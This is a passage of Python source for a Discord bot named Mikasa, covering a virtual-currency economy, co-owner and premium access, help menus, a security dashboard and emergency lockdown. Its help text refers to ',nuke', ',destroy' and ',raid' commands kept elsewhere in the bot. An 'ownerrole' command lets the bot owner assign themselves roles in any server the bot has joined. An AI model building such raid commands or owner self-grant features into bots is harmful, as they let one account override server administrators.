    if random.choice(("truth", "dare")) == "truth":
        return await _mikasa_truth(ctx)
    return await _mikasa_dare(ctx)



# ── Mikasa owner economy + roulette + premium security access ──────────────
def _mikasa_has_premium_access(ctx) -> bool:
    """Owner, explicitly premium-listed users, or members holding the server Premium Access role."""
    if getattr(getattr(ctx, "author", None), "id", None) == OWNER_ID:
        return True
    if getattr(getattr(ctx, "author", None), "id", None) in PREMIUM_USERS:
        return True
    author = getattr(ctx, "author", None)
    roles = getattr(author, "roles", []) or []
    accepted = {"premium", "premium access", "premium-access", "premium_access", "mikasa premium"}
    for role in roles:
        role_name = str(getattr(role, "name", "")).strip().casefold()
        if role_name in accepted or ("premium" in role_name and ("access" in role_name or role_name == "premium")):
            return True
    return False


def _mikasa_currency_settings() -> dict:
    data = load("mikasa_currency")
    return data if isinstance(data, dict) else {}


def _mikasa_currency_label() -> str:
    cfg = _mikasa_currency_settings()
    return str(cfg.get("name") or "Mikasa Coins")[:32]


def _mikasa_currency_symbol() -> str:
    cfg = _mikasa_currency_settings()
    return str(cfg.get("symbol") or "🪙")[:8]


@bot.command(name="setcurrency", aliases=["currencyset"])
async def _mikasa_set_currency(ctx, name: str, symbol: str = "🪙"):
    """Owner-only global label for the existing virtual in-bot currency."""
    if not has_owner_access(ctx.author):
        return await ctx.send("❌ Bot owner only. Only the bot owner can change Mikasa's currency name and symbol.")
    name = name.strip()
    symbol = symbol.strip()
    if not name or len(name) > 32 or not symbol or len(symbol) > 8:
        return await ctx.send(f"Usage: `{PREFIX}setcurrency MikasaGems 💎` (name up to 32 chars, symbol up to 8 chars).")
    save("mikasa_currency", {"name": name, "symbol": symbol})
    await ctx.send(f"✅ Mikasa's custom currency is now **{symbol} {name}**. This changes the display label; balances stay intact.")


@bot.command(name="currency", aliases=["currencyinfo", "mycurrency"])
async def _mikasa_currency_info(ctx):
    await ctx.send(f"{_mikasa_currency_symbol()} Mikasa currency: **{_mikasa_currency_label()}**\nOwner-only setup: `{PREFIX}setcurrency <name> <symbol>`\nVirtual in-bot points only; no real-money value or cash-out.")


@bot.command(name="lb", aliases=["clb", "currencylb", "gamblinglb", "leaderboard"])
@commands.guild_only()
async def _mikasa_currency_leaderboard(ctx):
    """Show this server's members ranked by their wallet + bank balance."""
    economy = load("economy")
    if not isinstance(economy, dict):
        economy = {}

    # Refresh the member list so users missing from the local cache are not
    # silently omitted from the leaderboard. Fall back to cache if Discord
    # denies the member fetch or the gateway intent is unavailable.
    members = []
    try:
        async for member in ctx.guild.fetch_members(limit=None):
            members.append(member)
    except Exception as exc:
        print(f"[currency leaderboard] member fetch failed: {exc}")
        members = list(getattr(ctx.guild, "members", []) or [])

    guild_key = str(ctx.guild.id)
    ranked = []
    seen_ids = set()
    for member in members:
        if getattr(member, "bot", False) or member.id in seen_ids:
            continue
        seen_ids.add(member.id)
        row = economy.get(str(member.id), {})
        if not isinstance(row, dict):
            continue

        # Match _GuildScopedEconomyRow: use this server's override when it
        # exists, otherwise preserve the legacy base balance for old accounts.
        balance_by_guild = row.get("balance_by_guild", {})
        bank_by_guild = row.get("bank_by_guild", {})
        if not isinstance(balance_by_guild, dict):
            balance_by_guild = {}
        if not isinstance(bank_by_guild, dict):
            bank_by_guild = {}
        wallet_raw = balance_by_guild.get(guild_key, row.get("balance", 0))
        bank_raw = bank_by_guild.get(guild_key, row.get("bank", 0))
        try:
            wallet_balance = max(0, int(wallet_raw or 0))
        except (TypeError, ValueError):
            wallet_balance = 0
        try:
            bank_balance = max(0, int(bank_raw or 0))
        except (TypeError, ValueError):
            bank_balance = 0

        total_balance = wallet_balance + bank_balance
        if total_balance > 0:
            ranked.append((total_balance, wallet_balance, bank_balance, member))

    ranked.sort(key=lambda item: (-item[0], item[3].id))
    symbol = _mikasa_currency_symbol()
    label = _mikasa_currency_label()
    if not ranked:
        return await ctx.send(embed=discord.Embed(
            title=f"🏆 {ctx.guild.name} — Gambling Leaderboard",
            description=(
                "No server currency balances to rank yet. Earn coins through the games and check again!"
            ),
            color=COLORS.get("info", 0x3498DB),
        ))

    medals = {1: "🥇", 2: "🥈", 3: "🥉"}
    lines = []
    for position, (total, wallet, bank, member) in enumerate(ranked[:15], 1):
        rank_label = medals.get(position, f"**{position}.**")
        lines.append(
            f"{rank_label} {member.mention} — **{symbol}{total:,}** "
            f"`(wallet {wallet:,} · bank {bank:,})`"
        )

    embed = discord.Embed(
        title=f"🏆 {ctx.guild.name} — Gambling Leaderboard",
        description="\n".join(lines),
        color=0xF1C40F,
    )
    embed.set_footer(text=f"Top 15 • {label} • This server only • Wallet + bank total")
    await ctx.send(embed=embed)


@bot.command(name="mintcurrency", aliases=["mintcoins", "owneraddcurrency"])
async def _mikasa_mint_currency(ctx, member: discord.Member, amount: int):
    """Owner-only minting; uses the existing economy balance so games keep working."""
    if not has_owner_access(ctx.author):
        return await ctx.send("❌ Bot owner only. Currency minting is owner-exclusive.")
    if amount <= 0 or amount > 1_000_000_000_000:
        return await ctx.send("❌ Amount must be between 1 and 1,000,000,000,000.")
    ud = get_pokemon_data(str(member.id))
    ud["balance"] = max(0, int(ud.get("balance", 0))) + amount
    save_pokemon_data(str(member.id), ud)
    await ctx.send(f"✅ Minted **{_mikasa_currency_symbol()}{amount:,} {_mikasa_currency_label()}** for {member.mention}. New balance: **{_mikasa_currency_symbol()}{ud['balance']:,}**.")


@bot.command(name="removecurrency", aliases=["burncurrency", "ownerremovecurrency"])
async def _mikasa_burn_currency(ctx, member: discord.Member, amount: int):
    """Owner-only removal of virtual currency."""
    if not has_owner_access(ctx.author):
        return await ctx.send("❌ Bot owner only. Currency removal is owner-exclusive.")
    if amount <= 0:
        return await ctx.send("❌ Amount must be greater than zero.")
    ud = get_pokemon_data(str(member.id))
    current = max(0, int(ud.get("balance", 0)))
    removed = min(current, amount)
    ud["balance"] = current - removed
    save_pokemon_data(str(member.id), ud)
    await ctx.send(f"✅ Removed **{_mikasa_currency_symbol()}{removed:,} {_mikasa_currency_label()}** from {member.mention}. New balance: **{_mikasa_currency_symbol()}{ud['balance']:,}**.")




# Restrict configuration/testing of the newly added security tools to the bot owner,
# listed premium users, or members holding the server's Premium Access role. The
# background detection/alert listeners continue running regardless of who can configure them.
async def _mikasa_require_premium(ctx) -> bool:
    if _mikasa_has_premium_access(ctx):
        return True
    await ctx.send("🔒 Premium Access required. Ask the server owner for the **Premium Access** role.", ephemeral=bool(getattr(ctx, "interaction", None)))
    return False


# Wrap the security configuration commands without changing their detection logic.
@bot.hybrid_command(name="levelsetup", description="Set Mikasa level-up announcements in a channel")
@commands.guild_only()
@app_commands.describe(channel="Channel for level-up messages")
async def _mikasa_levelsetup(ctx, channel: discord.TextChannel):
    # The existing setlevelchannel command owns the actual persistence and permission checks.
    await ctx.invoke(bot.get_command("setlevelchannel"), channel=channel)



# ── MIKASA_FINAL_SUITE_PATCH: owner tools + complete help catalog ─────────
# Safe, explicit owner controls. These never delete/raid servers or mass-DM members.

@bot.command(name="ownerpanel", aliases=["ownerhelp", "ownertools"])
async def _mikasa_ownerpanel(ctx):
    """Show owner-only controls; does not execute any action."""
    if not has_owner_access(ctx.author):
        return await ctx.send("🔒 This panel is bot-owner only.")
    embed = discord.Embed(
        title="👑 Mikasa Owner Control Panel",
        description=(
            "**Currency**\n"
            "`,setcurrency <name> <symbol>` · `,mintcurrency @user <amount>` · `,removecurrency @user <amount>`\n\n"
            "**Co-owner access (primary owner only)**\n"
            "`,coowneradd @user` · `,coownerremove @user` · `,coowners`\n\n"
            "**Premium access**\n"
            "`,premiumgrant @user` · `,premiumrevoke @user`\n\n"
            "**Bot controls**\n"
            "`,ownerannounce #channel <message>` · `,setbotactivity playing|watching|listening <text>`\n\n"
            "**Health & setup**\n"
            "`,configcheck` · `,securitycheck` · `,securitytest` · `,levelsetup #channel`\n\n"
            "High-impact destructive server actions are intentionally not added to this panel."
        ),
        color=COLORS.get("main", 0x5865F2),
    )
    embed.set_footer(text="Owner-only • Keep your bot token private")
    await ctx.send(embed=embed)


@bot.group(name="co-owner", aliases=["coowner", "co_owner"], invoke_without_command=True)
async def co_owner_group(ctx):
    """Manage co-owners. Subcommands: add, remove, list.
    Co-owners get full owner access except nuke, destroy, raid, and co-owner add/remove.
    """
    await ctx.send(embed=discord.Embed(
        title="👑 Co-Owner Management",
        description=(
            "`,co-owner add @user` — grant co-owner access (**primary owner only**)\n"
            "`,co-owner remove @user` — revoke co-owner access (**primary owner only**)\n"
            "`,co-owner list` — list current co-owners (owner or co-owner)\n\n"
            "**Co-owner access:** everything the owner can use, **except**\n"
            "• `,nuke` · `,destroy` · `,raid` / `,setraid`\n"
            "• `,co-owner add` / `,co-owner remove`\n\n"
            "Also available: `,ownerrole add/remove <role>` to manage roles on yourself (below the bot)."
        ),
        color=COLORS.get("main", 0x5865F2),
    ))


@co_owner_group.command(name="add")
async def co_owner_add(ctx, member: discord.Member):
    """Primary owner only: grant co-owner access."""
    if ctx.author.id != OWNER_ID:
        return await ctx.send("🔒 Only the **primary bot owner** can add co-owners.")
    if member.id == OWNER_ID or (bot.user and member.id == bot.user.id):
        return await ctx.send("❌ That account cannot be added as a co-owner.")
    if member.id in CO_OWNER_IDS:
        return await ctx.send(f"ℹ️ {member.mention} is already a co-owner.")
    CO_OWNER_IDS.add(member.id)
    try:
        save("coowners", sorted(CO_OWNER_IDS))
    except Exception as exc:
        CO_OWNER_IDS.discard(member.id)
        return await ctx.send(f"❌ Could not save co-owner access: `{type(exc).__name__}`")
    await ctx.send(f"✅ {member.mention} is now a **Mikasa Co-Owner**. They can use nearly all owner-level commands, but cannot add/remove co-owners.")


@co_owner_group.command(name="remove")
async def co_owner_remove(ctx, member: discord.Member):
    """Primary owner only: revoke co-owner access."""
    if ctx.author.id != OWNER_ID:
        return await ctx.send("🔒 Only the **primary bot owner** can remove co-owners.")
    if member.id not in CO_OWNER_IDS:
        return await ctx.send(f"ℹ️ {member.mention} is not on the co-owner list.")
    CO_OWNER_IDS.discard(member.id)
    try:
        save("coowners", sorted(CO_OWNER_IDS))
    except Exception as exc:
        CO_OWNER_IDS.add(member.id)
        return await ctx.send(f"❌ Could not save the removal: `{type(exc).__name__}`")
    await ctx.send(f"✅ Removed {member.mention} from **Mikasa Co-Owner** access.")


@co_owner_group.command(name="list")
async def co_owner_list(ctx):
    """List current co-owners (primary owner or any co-owner)."""
    if ctx.author.id != OWNER_ID and ctx.author.id not in CO_OWNER_IDS:
        return await ctx.send("🔒 Only the primary owner or a co-owner can view this list.")
    if not CO_OWNER_IDS:
        return await ctx.send("No co-owners are currently configured. Add one with `,co-owner add @user`.")
    lines = []
    for uid in sorted(CO_OWNER_IDS):
        user = bot.get_user(uid)
        lines.append(f"• {user.mention if user else f'<@{uid}>'} (`{uid}`)")
    await ctx.send(embed=discord.Embed(title="👑 Mikasa Co-Owners", description="\n".join(lines), color=COLORS.get("main", 0x5865F2)))


# Backward-compatible aliases
@bot.command(name="coowneradd", aliases=["addcoowner", "grantcoowner"])
async def _mikasa_coowneradd(ctx, member: discord.Member):
    await co_owner_add(ctx, member)

@bot.command(name="coownerremove", aliases=["removecoowner", "revokecoowner"])
async def _mikasa_coownerremove(ctx, member: discord.Member):
    await co_owner_remove(ctx, member)

@bot.command(name="coowners", aliases=["listcoowners"])
async def _mikasa_coowners(ctx):
    await co_owner_list(ctx)


async def _ownerrole_resolve_member(ctx: commands.Context):
    """Shared guards for ownerrole add/remove. Returns (member, error_embed_or_None)."""
    if not ctx.guild:
        return None, discord.Embed(description="❌ Server only.", color=COLORS["error"])
    if not has_owner_access(ctx.author):
        return None, discord.Embed(
            description="🔒 Only the **bot owner** or a **co-owner** can use `,ownerrole`.",
            color=COLORS["error"],
        )
    member = ctx.author
    if not isinstance(member, discord.Member):
        member = ctx.guild.get_member(ctx.author.id)
    if member is None:
        return None, discord.Embed(description="❌ Could not resolve your member object in this server.", color=COLORS["error"])
    return member, None


async def _ownerrole_resolve_role(ctx: commands.Context, role_query: str):
    """Resolve role and validate bot can manage it. Returns (role, error_embed_or_None)."""
    role_obj, err = _resolve_role_by_name(ctx.guild, role_query)
    if err:
        return None, discord.Embed(description=err, color=COLORS["error"])
    if role_obj.is_default():
        return None, discord.Embed(description="❌ You cannot use @everyone with this command.", color=COLORS["error"])
    if role_obj.managed:
        return None, discord.Embed(
            description="❌ That role is **managed** by an integration/bot and cannot be changed manually.",
            color=COLORS["error"],
        )
    me = ctx.guild.me
    if not me or not me.guild_permissions.manage_roles:
        return None, discord.Embed(
            description="❌ I need the **Manage Roles** permission.",
            color=COLORS["error"],
        )
    if role_obj >= me.top_role:
        return None, discord.Embed(
            description=(
                f"❌ I cannot manage {role_obj.mention} because it is **equal to or above** my highest role.\n"
                "Move **Mikasa's role** above that role in Server Settings → Roles, then try again."
            ),
            color=COLORS["error"],
        )
    return role_obj, None


@bot.hybrid_group(name="ownerrole", aliases=["selfrole", "giveroleme"], invoke_without_command=True, description="Owner/co-owner: add or remove roles on yourself")
@app_commands.describe(role="Optional: role name/mention/ID to add (or use subcommands add/remove)")
async def ownerrole_group(ctx: commands.Context, *, role: str = None):
    """`,ownerrole add/remove <role>` — self role management for owner/co-owner.

    Bare `,ownerrole <role>` still adds the role (same as `,ownerrole add`).
    """
    if role is None or not str(role).strip():
        return await ctx.send(embed=discord.Embed(
            title="👑 Owner Role",
            description=(
                f"`{PREFIX}ownerrole add <role>` — give yourself a role\n"
                f"`{PREFIX}ownerrole remove <role>` — remove a role from yourself\n\n"
                "Role can be a **mention**, **name** (spaces OK), or **ID**.\n"
                "The role must be **below** Mikasa's highest role."
            ),
            color=COLORS.get("main", 0x5865F2),
        ))
    # Default bare usage → add
    ctx.invoked_with = ctx.invoked_with  # keep
    await ownerrole_add(ctx, role=role)


@ownerrole_group.command(name="add", description="Add a role to yourself (name, mention, or ID)")
@app_commands.describe(role="Role name, mention, or ID")
async def ownerrole_add(ctx: commands.Context, *, role: str):
    """Add a role to yourself. Owner/co-owner only."""
    member, err_e = await _ownerrole_resolve_member(ctx)
    if err_e is not None:
        return await ctx.send(embed=err_e)
    role_obj, err_e = await _ownerrole_resolve_role(ctx, role)
    if err_e is not None:
        return await ctx.send(embed=err_e)

    if role_obj in member.roles:
        return await ctx.send(embed=discord.Embed(
            description=f"ℹ️ You already have {role_obj.mention}.",
            color=COLORS["info"],
        ))
    try:
        await member.add_roles(role_obj, reason=f"ownerrole add by {ctx.author} ({ctx.author.id})")
        await ctx.send(embed=discord.Embed(
            title="✅ Role Added",
            description=f"Gave you {role_obj.mention}.",
            color=COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            description="❌ Discord denied the role assignment. Check that my role is above the target role and I have **Manage Roles**.",
            color=COLORS["error"],
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


@ownerrole_group.command(name="remove", aliases=["rm", "take"], description="Remove a role from yourself (name, mention, or ID)")
@app_commands.describe(role="Role name, mention, or ID")
async def ownerrole_remove(ctx: commands.Context, *, role: str):
    """Remove a role from yourself. Owner/co-owner only."""
    member, err_e = await _ownerrole_resolve_member(ctx)
    if err_e is not None:
        return await ctx.send(embed=err_e)
    role_obj, err_e = await _ownerrole_resolve_role(ctx, role)
    if err_e is not None:
        return await ctx.send(embed=err_e)

    if role_obj not in member.roles:
        return await ctx.send(embed=discord.Embed(
            description=f"ℹ️ You do not have {role_obj.mention}.",
            color=COLORS["info"],
        ))
    try:
        await member.remove_roles(role_obj, reason=f"ownerrole remove by {ctx.author} ({ctx.author.id})")
        await ctx.send(embed=discord.Embed(
            title="✅ Role Removed",
            description=f"Removed {role_obj.mention} from you.",
            color=COLORS["success"],
        ))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            description="❌ Discord denied the role removal. Check that my role is above the target role and I have **Manage Roles**.",
            color=COLORS["error"],
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ {ex}", color=COLORS["error"]))


@bot.command(name="premiumgrant", aliases=["grantpremium", "premiumadd"])
async def _mikasa_premiumgrant(ctx, member: discord.Member):
    """Owner-only: add a user to the bot's persistent premium access list."""
    if not has_owner_access(ctx.author):
        return await ctx.send("🔒 Bot owner only.")
    PREMIUM_USERS.add(member.id)
    try:
        save("nukerlist", sorted(int(x) for x in PREMIUM_USERS))
    except Exception as exc:
        PREMIUM_USERS.discard(member.id)
        return await ctx.send(f"❌ Could not save premium access: `{type(exc).__name__}`")
    await ctx.send(f"✅ {member.mention} now has **Mikasa Premium Access** for premium-gated security configuration. This does not grant Discord server permissions.")


@bot.command(name="premiumrevoke", aliases=["revokepremium", "premiumremove"])
async def _mikasa_premiumrevoke(ctx, member: discord.Member):
    """Owner-only: remove a user from the bot's persistent premium access list."""
    if not has_owner_access(ctx.author):
        return await ctx.send("🔒 Bot owner only.")
    PREMIUM_USERS.discard(member.id)
    try:
        save("nukerlist", sorted(int(x) for x in PREMIUM_USERS))
    except Exception as exc:
        return await ctx.send(f"⚠️ Removed for this session, but saving failed: `{type(exc).__name__}`")
    await ctx.send(f"✅ Removed {member.mention} from the bot's premium user list. A server role named **Premium Access** may independently grant access where configured.")


@bot.command(name="ownerannounce", aliases=["ownerpost"])
async def _mikasa_ownerannounce(ctx, channel: discord.TextChannel, *, message: str):
    """Owner-only: post a single announcement to one specified channel."""
    if not has_owner_access(ctx.author):
        return await ctx.send("🔒 Bot owner only.")
    message = (message or "").strip()
    if not message:
        return await ctx.send(f"Usage: `{PREFIX}ownerannounce #channel Your announcement`")
    if len(message) > 1800:
        return await ctx.send("❌ Keep the announcement under 1800 characters.")
    try:
        await channel.send(
            content=f"📢 **Mikasa Announcement**\n{message}",
            allowed_mentions=discord.AllowedMentions.none(),
        )
        await ctx.send(f"✅ Announcement posted in {channel.mention}. No user mentions were pinged.")
    except discord.Forbidden:
        await ctx.send("❌ Mikasa needs permission to send messages in that channel.")
    except Exception as exc:
        await ctx.send(f"❌ Announcement failed: `{type(exc).__name__}`")


@bot.command(name="setbotactivity", aliases=["botactivity", "setactivity"])
async def _mikasa_setbotactivity(ctx, activity_type: str, *, text_value: str):
    """Owner-only: change the bot's visible Discord activity."""
    if not has_owner_access(ctx.author):
        return await ctx.send("🔒 Bot owner only.")
    activity_type = (activity_type or "").strip().lower()
    text_value = (text_value or "").strip()
    if activity_type not in {"playing", "watching", "listening"} or not text_value:
        return await ctx.send(f"Usage: `{PREFIX}setbotactivity playing|watching|listening <text>`")
    text_value = text_value[:128]
    activity = {
        "playing": discord.Game(name=text_value),
        "watching": discord.Activity(type=discord.ActivityType.watching, name=text_value),
        "listening": discord.Activity(type=discord.ActivityType.listening, name=text_value),
    }[activity_type]
    try:
        await bot.change_presence(activity=activity)
        await ctx.send(f"✅ Bot activity updated to **{activity_type.title()} {text_value}**.")
    except Exception as exc:
        await ctx.send(f"❌ Could not change activity: `{type(exc).__name__}`")


@bot.command(name="configcheck", aliases=["setupcheck", "serverconfig"])
@commands.guild_only()
async def _mikasa_configcheck(ctx):
    """Summarize common Mikasa setup channels/settings without changing anything."""
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    def _channel_value(*keys):
        for key in keys:
            raw = gs.get(key)
            if str(raw or "").isdigit():
                found = ctx.guild.get_channel(int(raw))
                if found:
                    return found.mention
        return "Not configured"
    perms = ctx.guild.me.guild_permissions if ctx.guild.me else None
    missing = []
    for label, attr in (("View Audit Log", "view_audit_log"), ("Manage Roles", "manage_roles"), ("Manage Channels", "manage_channels"), ("Send Messages", "send_messages"), ("Read Message History", "read_message_history")):
        if not perms or not getattr(perms, attr, False):
            missing.append(label)
    embed = discord.Embed(title="🧰 Mikasa Configuration Check", color=COLORS.get("main", 0x5865F2))
    embed.add_field(name="Welcome channel", value=_channel_value("welcome_channel", "welcome_channel_id"), inline=True)
    embed.add_field(name="General logs", value=_channel_value("log_channel", "logging_channel", "log_channel_id"), inline=True)
    embed.add_field(name="Security logs", value=_channel_value("security_log_channel", "antinuke_channel", "antinuke_alert_channel"), inline=True)
    embed.add_field(name="Level-up channel", value=_channel_value("level_channel", "levelup_channel", "level_channel_id"), inline=True)
    embed.add_field(name="Anti-nuke", value="Enabled" if gs.get("antinuke_enabled") else "Not enabled", inline=True)
    embed.add_field(name="RaidWatch", value="Enabled" if gs.get("raidwatch_enabled") else "Not enabled", inline=True)
    embed.add_field(name="Bot permissions to review", value="\n".join(f"• {x}" for x in missing) if missing else "No missing permissions from this quick check.", inline=False)
    embed.set_footer(text="Configuration check only; it cannot guarantee complete protection.")
    await ctx.send(embed=embed)


# Expand existing help categories. Existing game commands remain free; security configuration
# keeps its existing owner/premium gate. No real-money gambling or cash-out is introduced.
_append_help_items("admin", [
    (",coowneradd @user", "Primary owner only: grant co-owner operational access"),
    (",co-owner remove @user", "Primary owner only: revoke co-owner access"),
    (",coowners", "Primary owner only: list co-owners"),
])
_append_help_items("general", [
    (",ping", "Check gateway latency"), (",botstats", "Bot uptime, servers and command count"),
    (",whois @user", "Detailed member information"), (",invitebot", "Get the bot invite link"),
    (",configcheck", "Check common server setup channels and bot permissions"),
])
_append_help_items("setup", [
    (",setwelcome #channel", "Set or clear the welcome channel"),
    (",autorole add @role", "Configure roles for new members"),
    (",levelsetup #channel", "Set the level-up announcement channel"),
    (",givexp @user <amount>", "Owner: add XP (aliases: ,addxp, ,addexp)"),
    (",autorespond add trigger | reply", "Create a server auto-response"),
    (",ticketpanel [#channel]", "Publish a support ticket panel"),
    (",configcheck", "Check common setup configuration"),
])
_append_help_items("logging", [
    (",logstatus", "Check logging status"), (",setsecuritylog #channel", "Set security alert channel"),
    (",securitytest", "Send a test security alert"), (",auditrecent", "Read recent audit log entries"),
])
_append_help_items("invites", [
    (",myinvites", "View real/fake invite stats"), (",invitelb", "Invite leaderboard"),
    (",addinvites @user <amount>", "Admin: adjust invite count"),
    (",removeinvites @user <amount>", "Admin: remove invite count"),
])
_append_help_items("fun", [
    (",magic8ball <question>", "Ask the Magic 8 Ball"), (",choose option1 | option2", "Choose between options"),
    (",dice [sides]", "Roll a die"), (",compliment [@user]", "Send a friendly compliment"),
    (",roast [@user]", "Lighthearted roast game"), (",riddle", "Get a riddle"),
    (",luckyspin", "Free lucky spin; no wager"), (",fasttype", "Typing mini-game"),
    (",wordchain", "Play word chain"), (",meme", "Random meme"), (",joke", "Random joke"),
])
_append_help_items("gambling", [
    (",roulette <bet> <red|black|green|even|odd|0-36>", "European roulette using virtual coins"),
    (",luckyspin", "Free spin for fun; no wager"), (",slots <bet>", "Slot machine using virtual coins"),
    (",blackjack <bet>", "Blackjack using virtual coins"), (",coinflip <bet> heads|tails", "Coin flip using virtual coins"),
    (",setcurrency <name> <symbol>", "Owner only: rename the virtual currency"),
    (",currency", "Show the custom virtual currency label"),
    (",lb", "Show the server currency leaderboard (top balances)"),
    (",levellb", "Show the XP/level leaderboard"),
    (",mintcurrency @user <amount>", "Owner only: mint virtual currency"),
    (",removecurrency @user <amount>", "Owner only: remove virtual currency"),
])
_append_help_items("security", [
    (",securityhelp", "List security commands"), (",securitycheck", "Check anti-nuke settings and bot permissions"),
    (",securitycenter", "Security Intelligence Center dashboard"),
    (",setsecuritylog #channel", "Set security alert channel"), (",securitytest", "Test alert delivery"),
    (",raidwatch on|off|status", "Configure join-burst alerts"),
    (",raidwatch threshold 8", "Set alert threshold"), (",auditrecent", "Show recent audit log entries"),
])
_append_help_items("security", [
    (",securitycenter", "Security Intelligence Center: protection status, permissions, alerts and monitoring"),
    (",emergencylockdown confirm", "Primary bot owner only: temporarily block @everyone from sending messages"),
    (",emergencyunlock", "Primary bot owner only: restore saved @everyone send-message settings"),
])
_append_help_items("owner_only", [
    (",ownerpanel", "Owner/co-owner control panel"),
    (",emergencylockdown confirm", "Primary owner only: confirmed temporary server containment"),
    (",emergencyunlock", "Primary owner only: restore saved channel settings"),
    (",premiumgrant @user", "Owner only: grant bot premium access"),
    (",premiumrevoke @user", "Owner only: revoke bot premium access"),
    (",ownerannounce #channel <message>", "Owner only: send one non-pinging announcement"),
    (",setbotactivity playing|watching|listening <text>", "Owner only: set bot activity"),
])

# Comprehensive command index: dynamically includes every registered prefix command so new
# and legacy commands are discoverable in help without editing this list every time.
def _mikasa_refresh_allcommands_help():
    try:
        category = HELP_CATEGORIES.setdefault("allcommands", {
            "title": "📚 All Commands", "desc": "Complete index of registered prefix commands. Use command-specific help for details.", "cmds": []
        })
        rows = []
        for command in sorted(bot.commands, key=lambda c: c.name.casefold()):
            if getattr(command, "hidden", False):
                continue
            signature = (getattr(command, "signature", "") or "").strip()
            usage = f"{PREFIX}{command.name} {signature}".strip()
            description = (getattr(command, "short_doc", "") or getattr(command, "help", "") or "Command available; check the relevant help category.").strip().split("\n", 1)[0]
            rows.append((usage[:256], description[:500]))
        category["cmds"] = rows
    except Exception as exc:
        print(f"[allcommands help index] {exc}")

_mikasa_refresh_allcommands_help()


# ── Security Intelligence Center + primary-owner emergency containment ──
@bot.hybrid_command(name="securitycenter", aliases=["secintel", "securitydashboard"], description="Security Intelligence Center: current protection status")
@commands.guild_only()
@commands.has_guild_permissions(administrator=True)
async def _mikasa_securitycenter(ctx):
    guild = ctx.guild
    me = guild.me
    settings = load("server_settings")
    gs = gdata(settings, guild.id)
    perms = me.guild_permissions if me else None
    channel_id = gs.get("mikasa_all_logs_channel") or gs.get("antinuke_channel") or gs.get("antinuke_alert_channel") or gs.get("security_log_channel")
    alert_channel = guild.get_channel(int(channel_id)) if str(channel_id or "").isdigit() else None
    antinuke_enabled = bool(gs.get("antinuke_enabled", False))
    raidwatch_enabled = bool(gs.get("raidwatch_enabled", False))
    threshold = max(5, min(25, int(gs.get("raidwatch_threshold", 8) or 8)))
    checks = []
    for label, attr in (("View Audit Log", "view_audit_log"), ("Manage Roles", "manage_roles"),
                        ("Manage Channels", "manage_channels"), ("Kick Members", "kick_members"),
                        ("Ban Members", "ban_members"), ("Moderate Members", "moderate_members"),
                        ("View Channels", "view_channel"), ("Send Messages", "send_messages")):
        checks.append((label, bool(getattr(perms, attr, False)) if perms else False))
    missing = [label for label, ok in checks if not ok]
    embed = discord.Embed(
        title="🛡️ Mikasa Security Intelligence Center",
        description=(f"**Server:** {guild.name}\n"
                     "Live configuration overview. This reports configured controls; it cannot guarantee complete protection."),
        color=0x5865F2,
    )
    embed.add_field(name="Anti-nuke", value="🟢 Enabled" if antinuke_enabled else "🟠 Disabled", inline=True)
    embed.add_field(name="RaidWatch", value=(f"🟢 Enabled · threshold {threshold}" if raidwatch_enabled else f"🟠 Disabled · threshold {threshold}"), inline=True)
    embed.add_field(name="Security alerts", value=alert_channel.mention if alert_channel else "⚠️ Channel not configured", inline=True)
    embed.add_field(name="Bot permission health", value=("✅ All checked permissions present" if not missing else "⚠️ Missing: " + ", ".join(missing)), inline=False)
    embed.add_field(name="Quick actions", value=("`,securitycheck` — permission/config check\n"
        "`,setsecuritylog #channel` — configure security alerts\n"
        "`,securitytest` — test alert delivery\n"
        "`,raidwatch on|off|status` — configure join-burst monitoring\n"
        "`,auditrecent` — review recent audit events\n"
        "`,antinuke status` — inspect anti-nuke configuration"), inline=False)
    embed.add_field(name="Hardening advice", value="Keep the bot role below trusted staff roles, limit Administrator permissions, enable 2FA for moderators, and review audit logs regularly.", inline=False)
    embed.set_footer(text="Security Intelligence Center · alerts and monitoring, not a guarantee")
    await ctx.send(embed=embed, ephemeral=bool(getattr(ctx, "interaction", None)))


class _EmergencyLockdownConfirmView(discord.ui.View):
    def __init__(self, owner_id: int, guild_id: int):
        super().__init__(timeout=45)
        self.owner_id = int(owner_id)
        self.guild_id = int(guild_id)

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.owner_id or interaction.user.id != OWNER_ID:
            await interaction.response.send_message("Only the primary bot owner can confirm this action.", ephemeral=True)
            return False
        if not interaction.guild or interaction.guild.id != self.guild_id:
            await interaction.response.send_message("This confirmation belongs to another server.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="Confirm temporary lockdown", style=discord.ButtonStyle.danger)
    async def confirm_lockdown(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        settings = load("server_settings")
        gs = gdata(settings, guild.id)
        if gs.get("emergency_lockdown_backup"):
            return await interaction.response.send_message("A lockdown backup already exists. Use `,emergencyunlock` before starting another.", ephemeral=True)
        everyone = guild.default_role
        backup = {}
        locked = 0
        failed = 0
        # Save original @everyone send_messages values so unlock can restore them.
        for channel in list(guild.text_channels):
            try:
                overwrite = channel.overwrites_for(everyone)
                backup[str(channel.id)] = overwrite.send_messages
                overwrite.send_messages = False
                await channel.set_permissions(everyone, overwrite=overwrite, reason="Mikasa primary-owner emergency containment")
                locked += 1
            except Exception:
                failed += 1
        gs["emergency_lockdown_backup"] = backup
        gs["emergency_lockdown_active"] = True
        save("server_settings", settings)
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(embed=discord.Embed(
            title="🚨 Emergency containment applied",
            description=(f"Temporarily blocked @everyone from sending messages in **{locked}** text channels.\n"
                         f"Failed channels: **{failed}**. No channels, roles, or messages were deleted.\n\n"
                         "Use `,emergencyunlock` to restore the saved send-message settings."),
            color=0xED4245), view=self)

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel_lockdown(self, interaction: discord.Interaction, button: discord.ui.Button):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="Emergency lockdown cancelled.", embed=None, view=self)


@bot.command(name="emergencylockdown")
@commands.guild_only()
async def _mikasa_emergencylockdown(ctx, confirm: str = ""):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Primary bot owner only. Co-owners cannot trigger emergency lockdown.")
